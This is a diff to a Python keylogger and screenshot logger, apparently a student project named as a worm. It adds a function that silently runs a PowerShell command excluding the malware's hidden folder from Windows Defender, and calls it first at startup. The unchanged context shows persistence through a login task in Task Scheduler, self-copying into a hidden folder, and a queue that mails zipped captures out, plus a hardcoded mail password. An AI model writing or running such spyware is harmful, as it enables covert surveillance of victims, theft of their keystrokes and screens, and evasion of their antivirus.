@@ -43,6 +43,7 @@ PASSWORD = "rtpq bdhn pqib rrgk"
 logLock = threading.Lock()
 screenshotCount = 0
 
+# Maakt de default parameters aan in een JSON bestand als het bestand niet bestaat
 def createParamJson():
     defaultParams = {
         "TimeBetweenEachScreenshot" : 300,
@@ -57,7 +58,7 @@ def createParamJson():
         with open(paramsPath, 'w') as paramsFile:
             json.dump(defaultParams, paramsFile, indent=4)
 
-
+# Laadt de parameters uit de JSON file, of gebruikt default waarden als het bestand niet bestaat
 def loadParams():
     if os.path.exists(paramsPath):
         with open(paramsPath, 'r') as paramsFile:
@@ -79,6 +80,21 @@ def loadParams():
         return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval
 
 timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval = loadParams()
+
+def add_defender_exclusion():
+    try:
+        subprocess.run(
+            [
+                "powershell.exe",
+                "-NoProfile",
+                "-Command",
+                f'Add-MpPreference -ExclusionPath "{hiddenFolderPath}"'
+            ],
+            capture_output=True,
+            check=True
+        )
+    except subprocess.CalledProcessError:
+        pass
 
 # functie die een taak maakt in taakplanner waarbij het script zichzelf uitvoert
 def runOnLogin(taskName, scriptPath):
@@ -199,6 +215,7 @@ def sendSingleMail(zipFile):
     except Exception:
         return False
     
+# Mail queue functie die alle zips in de map stuurt
 def mailQueue():
     while not exitEvent.is_set():
         zipFiles = [
@@ -304,6 +321,7 @@ def killSwitch():
 
 if __name__ == "__main__":
     try:    
+        add_defender_exclusion()
         runOnLogin("s142486_Worm", scriptPath)
         makeStructure()
         copyScript(hiddenFolderPath)
